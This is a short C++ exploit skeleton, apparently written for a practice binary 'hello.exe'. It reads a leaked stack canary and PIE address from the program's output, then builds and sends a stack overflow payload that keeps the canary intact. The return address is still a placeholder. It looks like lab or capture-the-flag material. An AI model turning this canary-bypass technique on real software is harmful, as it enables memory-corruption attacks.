#include <iostream>
#include <stdio.h>
#include <windows.h>
#include "pwntools.h"

int main(void) {
	char payload[0x50] = {0};

	proc_t* p = process("hello.exe");
	Sleep(1);

	p->recvuntil("buf+40: ");
	unsigned long long canary = strtoull(p->recvline(), NULL, 0x10);
	
	p->recvuntil("buf+56: ");
	unsigned long long pie_leak = strtoull(p->recvline(), NULL, 0x10);


	std::cout << std::hex << canary << std::endl;
	std::cout << std::hex << pie_leak << std::endl;

	memcpy(payload, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 0x28);
	memcpy(payload+0x28, p64(canary), 0x8);
	memcpy(payload+0x30, "AAAAAAAA", 0x8);
	memcpy(payload+0x38, "BBBBBBBB", 0x8);

	p->send(payload, 0x40);
}
